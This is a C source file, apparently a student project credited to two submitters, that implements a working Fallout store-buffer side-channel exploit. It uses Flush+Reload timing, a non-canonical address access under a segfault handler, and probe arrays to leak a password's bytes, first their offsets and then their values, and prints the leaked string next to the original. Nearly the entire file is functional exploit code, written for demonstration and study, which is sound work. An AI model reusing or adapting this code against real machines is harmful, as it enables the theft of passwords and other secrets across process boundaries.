#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#include "cacheutils.h"

/*Submitters: Hanna Hayik & Michael Atias*/

/*Acknowledgment: We would like to thank IAIK (Information Processing & Data Institue) in Graz, Austria
Because we used their cache utilties file (cacheutils.h) that allowed us to better Understand, Explain and Perform this attack
you can find the original files from their Public Github page: https://github.com/IAIK/ZombieLoad */

//probe array
char __attribute__((aligned(4096))) mem[256 * 4096];
int hist[256];

//calls flush and reload and updates our arrays with Cache Hits
void recover(int[], int);

//leaks the secret values that the password bytes will be written to
void fallout_offsets(int str_len, char* str, int toReturn[], int offsets[]){
  // Initialize and flush LUT
  memset(mem, 0, sizeof(mem));
  
  //change segmentation fault handler to the try catch handler in cacheutils.h
  signal(SIGSEGV, trycatch_segfault_handler);
  
  //non-canonical address to attack
  char* attacker_address =(char*) 0x9876543214321000ull;
  
  //flush the probe array from cache
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }

  //to stop page prefetching, we create str_len pages to write to and put them into an array
  char* offset_pages[str_len];
  for(int i=0; i<str_len; i++)
    offset_pages[i]=(char*)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  
  //flush the pages from the caches and initalize toReturn array with -1 values
  for(int i=0; i<str_len; i++){
    flush(offset_pages[i]);
    toReturn[i]=-1;
  }
  //flush memory changes before the attack begins, reducing noise in the cache timing attack
  mfence();
  //loop index
  int i=0;
  while(i<str_len){
    //write offset to proper page
    (offset_pages[i])[i]=(char)offsets[i];
    //try to leak it throught Fallout exploit
    if (!setjmp(trycatch_buf)) {
  	  maccess(mem + 4096 * attacker_address[i]);
    }
    //recover leaked values and update arrays
    recover(toReturn, i);
    i++;
  }
  
  //free the mapped pages before leaving
  for(int i=0; i<str_len; i++)
    munmap(offset_pages[i], 4096);
}

//leaks password bytes based on the leaked_offsets array from the previous attack, while the victim writes to the original offsets
void fallout_values(int str_len, char* str, int toReturn[], int victim_offsets[], int leaked_offsets[]){
  // Initialize and flush LUT
  memset(mem, 0, sizeof(mem));
  
  signal(SIGSEGV, trycatch_segfault_handler);
  char* attacker_address =(char*) 0x9876543214321000ull;
  
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }
  char* victim_pages[str_len];
  for(int i=0; i<str_len; i++)
    victim_pages[i]=(char*)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  
  for(int i=0; i<str_len; i++){
    flush(victim_pages[i]);
    toReturn[i]=-1;
  }
  mfence();
  //we are mostly using an OS that has KPTI, we use sleep to flush store buffer before we start the attack to reduce the noise (we didn't feel that it changed the results much)
  //usleep(100);
  int i=0;
  while(i<str_len){
    (victim_pages[i])[victim_offsets[i]]=str[i];
    if (!setjmp(trycatch_buf)) {
  	  maccess(mem + 4096 * attacker_address[leaked_offsets[i]]);
    }
    recover(toReturn, i);
    i++;
  }
  for(int i=0; i<str_len; i++)
    munmap(victim_pages[i], 4096);
  
}
int main(int argc, char *argv[]) {
  	// Calculate Flush+Reload threshold
  fprintf(stderr, "Calculating CACHE_MISS Cycles....\n");
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "---> Flush+Reload Cache Miss Cycles: %zu\n\n", CACHE_MISS);
  
  //open password file to read password
  FILE *fptr = fopen("password","r");
  
  //maximum password length is 1024
  char str[1024];
  
  //read password from file
  fgets(str, 1024, fptr);
  
  //minus the zero byte to get the correct length
  int str_len = strlen(str)-1;
  
  //array to hold the original offsets
  int offsets[str_len];
  //array for final combining, contains leaked offsets
  int final_res[str_len];
  //array for final combining (after 1000 probes), contains leaked password
  int password[str_len];
  for(int i=0; i<str_len; i++){
    //generate random offsets and scale them to 127
    offsets[i]=(rand())%127;

    //uncomment this line to see offsets generated
    //printf("generated[%d] %d \n", i, offsets[i]);
    
    //init arrays
    final_res[i]=-1;
    password[i]=-1;
  }
  //probes is the number of attacks we perform at every fallout function
  int probes = 1000;
  
  //big array to perform analysis
  int Kresults[probes][str_len];
  //init all cells to -1
  for(int i=0; i<probes; i++){
    for(int j=0; j<str_len; j++){
      Kresults[i][j]=-1;
    }
  }
  //write/leak offsets probes times
  for(int i=0; i<probes; i++)
    fallout_offsets(str_len, str, Kresults[i], offsets);
  
  for(int i=0; i<probes; i++){
    for(int j=0; j<str_len; j++){
      if(Kresults[i][j]!=-1){
        //according to leaked bytes, fill the final_res (leaked offsets) array
        final_res[j]=Kresults[i][j];
      }
    }
  }
  //counter for debug and printing purposes
  int total=0;
  for(int i=0; i<str_len; i++)
    if(final_res[i]!=-1){
      //uncomment to see what offsets were leaked
      //printf("finas_Res[%d] = %d\n", i, final_res[i]);
      total++;
    }
  printf("Original Password Length: %d\n", str_len);
  printf("LEAKED OFFSETS IN TOTAL: %d\n\n", total);
  
    //init all cells to -1
  for(int i=0; i<probes; i++){
    for(int j=0; j<str_len; j++){
      Kresults[i][j]=-1;
    }
  }
  
  for(int i=0; i<probes; i++)
    fallout_values(str_len, str, Kresults[i], offsets, final_res);
  for(int i=0; i<probes; i++){
    for(int j=0; j<str_len; j++){
      if(Kresults[i][j]!=-1){
        password[j]=Kresults[i][j];
      }
    }
  }
  total=0;
  //print leaked password, _ means no byte was leaked
  printf("leaked password:    ");
    for(int i=0; i<str_len; i++){
    if(password[i]!=-1){
      printf("%c", (char)password[i]);
      total++;
    }
    else
      printf("_");
    }
  //print original password to compare
  printf("\noriginal password:  ");
    for(int i=0; i<str_len; i++)
      printf("%c", str[i]);
  printf("\n\n");
  //leaked bytes doesn't mean we leaked correct bytes!!
  printf("LEAKED PASSWORD BYTES IN TOTAL: %d\n\n", total);
  
  //close file pointer
  fclose(fptr);
  return 0;
}

void recover(int results[], int index) {
  // Recover value from cache and update histogram
  int update = 0;
  for (size_t i = 1; i <= 255; i++) {
    //do flush and reload on probe array
    if (flush_reload((char *)mem + 4096 * i)) {
      //if Cache Hit, update history and turn update flag on
      hist[i]++;
      update = 1;
    }
  }

  // If new hit, update results array
  if(update){
  	for (size_t i =0; i<256; i++)
  		if(hist[i]){ 
        hist[i]=0;
  			results[index]=i;
      }
  }
}
